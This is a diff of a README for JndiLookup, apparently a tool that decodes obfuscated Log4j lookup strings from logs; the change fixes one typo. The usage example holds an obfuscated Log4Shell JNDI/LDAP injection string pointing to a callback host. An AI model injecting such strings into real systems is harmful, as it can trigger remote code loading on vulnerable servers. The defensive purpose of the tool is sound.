@@ -13,7 +13,7 @@ With no argument, the JndiLookup tool read lines from stdin and "convert" them u
 For example : cat access.log | java -jar JndiLookup.jar
 
 
-If you pass a string to the command line, the tool will convert this string and exists (please escape all the '$' characters).
+If you pass a string to the command line, the tool will convert this string and exits (please escape all the '$' characters).
 
 For example : java -jar JndiLookup.jar java -jar JndiLookup.jar "\${jndi:\${lower:l}\${lower:d}a\${lower:p}://world443.log4j.bin\${upper:a}ryedge.io:80/callback}"
 
